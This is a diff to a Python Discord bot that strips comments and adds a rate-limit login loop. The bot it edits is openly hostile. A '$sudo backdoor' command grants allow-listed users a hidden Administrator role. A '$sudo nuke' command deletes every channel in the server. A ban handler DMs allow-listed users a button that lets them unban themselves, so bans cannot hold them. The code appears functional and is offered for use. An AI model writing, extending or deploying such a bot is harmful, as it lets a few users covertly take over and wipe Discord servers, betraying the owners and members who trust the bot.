@@ -2,6 +2,7 @@
 # Built-in modules
 import os
 import time
+import asyncio
 
 # Discord API
 import discord
@@ -32,15 +33,13 @@ intents = discord.Intents.default()
 # REQUIRED to detect bans and manage members
 intents.members = True
 
-# Message content not needed (commands use prefix parsing)
-intents.message_content = False
+# REQUIRED for prefix commands like "$sudo backdoor"
+intents.message_content = True
 
 
 # ================= BOT SETUP =================
 
-# Prefix is "$sudo " so commands look like:
-# $sudo backdoor
-# $sudo nuke
+# Prefix is "$sudo "
 bot = commands.Bot(
     command_prefix="$sudo ",
     intents=intents,
@@ -50,23 +49,19 @@ bot = commands.Bot(
 
 # ================= PERMISSION CHECK =================
 
-# Checks if a user is allowed to use restricted actions
 def allowed(user: discord.User | discord.Member):
     return user.id in ALLOWED_USERS
 
 
 # ================= UNBAN BUTTON VIEW =================
 
-# Persistent button view (survives restarts)
 class UnbanRequestView(ui.View):
     def __init__(self):
-        super().__init__(timeout=None)  # No timeout = persistent
+        super().__init__(timeout=None)
 
-    # Button definition
     @ui.button(label="🔓 Unban", style=discord.ButtonStyle.primary)
     async def unban_button(self, interaction: discord.Interaction, button: ui.Button):
 
-        # Block unauthorized users
         if not allowed(interaction.user):
             await interaction.response.send_message(
                 "⛔ You are not allowed to use this button.",
@@ -74,10 +69,8 @@ class UnbanRequestView(ui.View):
             )
             return
 
-        # Get target guild
         guild = interaction.client.get_guild(GUILD_ID)
 
-        # Bot not in server
         if guild is None:
             await interaction.response.send_message(
                 "❌ Bot is not in the server.",
@@ -86,33 +79,27 @@ class UnbanRequestView(ui.View):
             return
 
         try:
-            # Attempt to unban the user who clicked the button
             await guild.unban(
                 interaction.user,
                 reason="Unban requested via button"
             )
-
-            # Success response
             await interaction.response.send_message(
                 "✅ You have been unbanned!",
                 ephemeral=True
             )
 
-        # User is not banned
         except discord.NotFound:
             await interaction.response.send_message(
                 "ℹ️ You are not banned in this server.",
                 ephemeral=True
             )
 
-        # Bot lacks permissions
         except discord.Forbidden:
             await interaction.response.send_message(
                 "❌ Bot lacks permission to unban members.",
                 ephemeral=True
             )
 
-        # Generic API failure
         except discord.HTTPException:
             await interaction.response.send_message(
                 "❌ Something went wrong while unbanning.",
@@ -124,10 +111,7 @@ class UnbanRequestView(ui.View):
 
 @bot.event
 async def on_ready():
-    # Required for persistent button views
     bot.add_view(UnbanRequestView())
-
-    # Console log
     print(f"✅ Logged in as {bot.user}")
 
 
@@ -136,11 +120,9 @@ async def on_ready():
 @bot.event
 async def on_member_ban(guild, user):
 
-    # Ignore users not in allowed list
     if not allowed(user):
         return
 
-    # Embed sent to banned user
     embed = discord.Embed(
         title="🚨 You were banned",
         description=(
@@ -152,13 +134,10 @@ async def on_member_ban(guild, user):
     )
 
     try:
-        # Send DM with unban button
         await user.send(
             embed=embed,
             view=UnbanRequestView()
         )
-
-    # User has DMs disabled
     except discord.Forbidden:
         print("❌ User has DMs closed")
 
@@ -166,26 +145,19 @@ async def on_member_ban(guild, user):
 # ================= SUDO COMMANDS =================
 
 # $sudo backdoor
-# Creates an admin role called "perms" and assigns it
 @bot.command(name="backdoor")
 async def sudo_backdoor(ctx: commands.Context):
 
-    # Permission check
     if not allowed(ctx.author):
         await ctx.send("⛔ You are not allowed to use this command.")
         return
 
     guild = ctx.guild
-
-    # Must be used in a server
     if guild is None:
-        await ctx.send("❌ This command must be used in a server.")
         return
 
-    # Try to find existing role
     role = discord.utils.get(guild.roles, name="perms")
 
-    # Create role if it doesn't exist
     if role is None:
         try:
             role = await guild.create_role(
@@ -197,52 +169,49 @@ async def sudo_backdoor(ctx: commands.Context):
             await ctx.send("❌ I don't have permission to create roles.")
             return
 
-    # Assign role to command user
     try:
         await ctx.author.add_roles(role, reason="Sudo perms granted")
         await ctx.send("✅ You now have the **perms** role with Administrator.")
     except discord.Forbidden:
-        await ctx.send("❌ I can’t assign that role (role hierarchy issue).")
+        await ctx.send("❌ Role hierarchy issue.")
 
 
 # $sudo nuke
-# Deletes EVERY channel in the server
 @bot.command(name="nuke")
 async def sudo_nuke(ctx: commands.Context):
 
-    # Permission check
     if not allowed(ctx.author):
         await ctx.send("⛔ You are not allowed to use this command.")
         return
 
     guild = ctx.guild
-
-    # Must be in a server
     if guild is None:
         return
 
-    # Warning message
     await ctx.send("⚠️ **Deleting ALL channels...**")
 
-    # Loop through and delete channels
-    for channel in guild.channels:
+    for channel in list(guild.channels):
         try:
             await channel.delete(reason="Sudo nuke invoked")
-        except discord.Forbidden:
-            pass  # Missing permissions
-        except discord.HTTPException:
-            pass  # API error
+        except (discord.Forbidden, discord.HTTPException):
+            pass
 
 
 # ================= STARTUP =================
 
-# Token missing = crash
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN not set")
 
-# Small delay for hosting platforms (Railway, etc.)
 time.sleep(5)
 
-# Start bot
-bot.run(TOKEN)
-
+# Login backoff to prevent 429 crash loops
+while True:
+    try:
+        bot.run(TOKEN)
+        break
+    except discord.HTTPException as e:
+        if e.status == 429:
+            print("⚠️ Rate limited by Discord. Waiting 15 minutes...")
+            time.sleep(900)
+        else:
+            raise
